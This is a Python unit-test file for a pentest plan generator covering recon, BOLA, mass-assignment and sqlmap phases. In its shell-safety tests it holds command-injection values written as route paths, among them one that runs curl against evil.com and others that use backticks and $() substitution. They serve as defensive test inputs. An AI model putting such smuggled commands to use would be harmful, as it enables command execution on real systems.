"""Pentest test plan — phased, targeted runbook derived from the attack-surface inventory."""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from websec_validator import inventory, testplan  # noqa: E402


def _facts(endpoints, guards=(), sinks=None, targeting=None, graphql=None, sensitive=None):
    return {
        "routes": {"endpoints": list(endpoints), "targeting": dict(targeting or {})},
        "authz": {"endpoint_guards": list(guards)},
        "surface": {"sinks": dict(sinks or {})},
        "graphql": dict(graphql or {}),
        "schemas": {"sensitive_fields": list(sensitive or [])},
    }


class TestPlanTests(unittest.TestCase):
    def _plan(self, facts):
        return testplan.build(facts, inventory.build(facts))

    def test_phase1_always_has_safe_recon(self):
        plan = self._plan(_facts(endpoints=[]))
        p1 = plan["phases"][0]
        self.assertIn("SAFE", p1["name"])
        titles = " ".join(i["title"] for i in p1["items"])
        self.assertIn("TLS", titles)
        self.assertIn("headers", titles.lower())

    def test_graphql_adds_introspection_probe_only_when_present(self):
        without = self._plan(_facts(endpoints=[]))
        self.assertFalse(any("introspection" in i["title"].lower()
                             for i in without["phases"][0]["items"]))
        withgql = self._plan(_facts(endpoints=[], graphql={"present": True, "endpoint": "/gql"}))
        gql = [i for i in withgql["phases"][0]["items"] if "introspection" in i["title"].lower()]
        self.assertEqual(len(gql), 1)
        self.assertIn("/gql", gql[0]["command"])

    def test_phase2_bola_targets_come_from_path_param_endpoints(self):
        f = _facts(endpoints=[{"method": "GET", "path": "/orders/{id}", "code_path": "o.js",
                               "params": [{"name": "id", "where": "path"}]}],
                   targeting={"idor_candidates": ["GET /orders/{id}"]})
        plan = self._plan(f)
        p2 = plan["phases"][1]
        self.assertTrue(any("BOLA" in i["title"] for i in p2["items"]))
        bola = next(i for i in p2["items"] if "BOLA" in i["title"])
        self.assertIn("/orders/{id}", bola["command"])
        self.assertIn("BOLA", bola["oracle"] + bola["title"])       # carries a confirm/disconfirm oracle
        self.assertTrue(bola["oracle"])

    def test_mass_assignment_probe_uses_extracted_privileged_fields(self):
        f = _facts(endpoints=[{"method": "POST", "path": "/users", "code_path": "u.js"}],
                   guards=[{"method": "POST", "path": "/users", "guarded": True, "analyzed": True}],
                   sensitive=["isAdmin", "role"])
        plan = self._plan(f)
        ma = [i for p in plan["phases"] for i in p["items"] if "Mass-assignment" in i["title"]]
        self.assertEqual(len(ma), 1)
        self.assertIn("isAdmin", ma[0]["command"])

    def test_phase3_injection_only_targets_sink_backed_endpoints(self):
        f = _facts(
            endpoints=[{"method": "GET", "path": "/q", "code_path": "db.js",
                        "params": [{"name": "id", "where": "query"}]},
                       {"method": "GET", "path": "/safe", "code_path": "safe.js"}],
            sinks={"sql-injection": {"files": ["db.js"], "count": 1}})
        plan = self._plan(f)
        p3 = plan["phases"][2]
        self.assertIn("INJECTION", p3["name"])
        targets = [i["target"] for i in p3["items"]]
        self.assertTrue(any("/q" in t for t in targets))
        self.assertFalse(any("/safe" in t for t in targets))       # no sink → not fuzzed
        sqli = next(i for i in p3["items"] if "sqlmap" in i["tool"])
        self.assertIn("sqlmap", sqli["command"])

    def test_phase3_is_gated_with_authorization_warning(self):
        plan = self._plan(_facts(endpoints=[]))
        self.assertIn("authorization", plan["phases"][2]["gate"].lower())

    def test_render_and_summary(self):
        f = _facts(endpoints=[{"method": "GET", "path": "/o/{id}", "code_path": "o.js",
                               "params": [{"name": "id", "where": "path"}]}],
                   targeting={"idor_candidates": ["GET /o/{id}"]})
        plan = self._plan(f)
        self.assertGreaterEqual(plan["summary"]["total"], plan["summary"]["phase1"])
        md = testplan.render_md(plan)
        self.assertIn("$BASE_URL", md)
        self.assertIn("oracle", md)
        self.assertIn("Phase 1", md)




class ShellSafetyTests(unittest.TestCase):
    """websec must never hand a user a copy-paste command that executes something unintended."""

    def _plan(self, paths):
        f = _facts(endpoints=[{"method": "GET", "path": p, "code_path": "a.js",
                               "params": [{"name": "id", "where": "path"}]} for p in paths],
                   targeting={"idor_candidates": [f"GET {p}" for p in paths]})
        return testplan.build(f, inventory.build(f))

    def _commands(self, plan):
        return " ".join(i["command"] for ph in plan["phases"] for i in ph["items"])

    def test_path_that_breaks_out_of_the_quoting_is_dropped(self):
        cmds = self._commands(self._plan(['/api/x";curl evil.com;#']))
        self.assertNotIn("curl evil.com", cmds)

    def test_parameterised_routes_are_still_planned(self):
        # guard against over-correcting: `{id}` is the most common IDOR-target shape, and rejecting
        # it would silently strip nearly every endpoint Phase 2 exists to test.
        cmds = self._commands(self._plan(["/api/orders/{id}"]))
        self.assertIn("/api/orders/{id}", cmds)

    def test_backtick_and_dollar_paths_are_dropped(self):
        for bad in ["/api/`whoami`", "/api/$(id)", "/api/a b"]:
            self.assertEqual(testplan._safe_path(bad), "", bad)
        self.assertEqual(testplan._safe_path("/api/orders/{id}"), "/api/orders/{id}")

if __name__ == "__main__":
    unittest.main()
